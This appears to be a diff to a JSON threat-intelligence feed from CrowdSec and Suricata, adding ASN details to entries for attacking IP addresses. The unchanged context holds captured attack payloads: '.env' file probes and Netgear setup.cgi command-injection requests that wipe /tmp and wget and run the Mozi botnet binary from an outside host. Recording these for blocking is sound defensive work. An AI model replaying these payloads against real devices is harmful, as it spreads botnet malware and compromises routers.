@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-04-28T12:00:00Z",
+  "generated_at": "2026-04-28T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
@@ -417,6 +417,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com",
+      "asn_prefix": "34.240.0.0/13",
       "tags": [
         "mwl:cloud=\"aws\""
       ],
@@ -437,6 +440,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "51852",
+      "asn_name": "PLI-AS Private Layer INC",
+      "asn_prefix": "179.43.146.0/24",
       "payloads": [
         "GET /.env",
         "GET /.env.local",
@@ -465,6 +471,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "142647",
+      "asn_name": "NAN-AS-AP Nasstec Airnet Networks Private Limited",
+      "asn_prefix": "103.173.7.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
